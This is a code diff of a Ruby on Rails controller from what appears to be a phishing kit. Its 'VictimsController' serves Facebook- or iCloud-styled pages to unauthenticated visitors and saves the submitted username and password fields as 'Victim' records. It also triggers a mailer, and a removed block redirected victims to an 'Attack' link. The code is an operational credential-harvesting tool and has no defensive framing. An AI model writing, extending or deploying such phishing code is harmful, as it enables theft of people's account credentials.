@@ -1,5 +1,5 @@
 class VictimsController < ApplicationController
-	layout 'facebook'
+	layout "icloud"
 	 before_action :authenticate_user!, except: [:new,:create,:movil]
 	def mobile_device?
 	   if session[:mobile_param]
@@ -10,17 +10,11 @@ class VictimsController < ApplicationController
 	end
 	def new 
 		@V= Victim.new
+		VictimMailer.uuu.deliver
 	end
-	def movil
-		
-	end
+
 	def create
 		@V=Victim.create(usu: params[:victim][:usu],con: params[:victim][:con],swusu: params[:victim][:swusu])
-		if params[:victim][:link] != ""
-			cad =Attack.find( params[:victim][:link])
-			redirect_to "#{cad.link}"
-		else
-			redirect_to "https://www.facebook.com/"
-		end
+		redirect_to root_path
 	end
 end
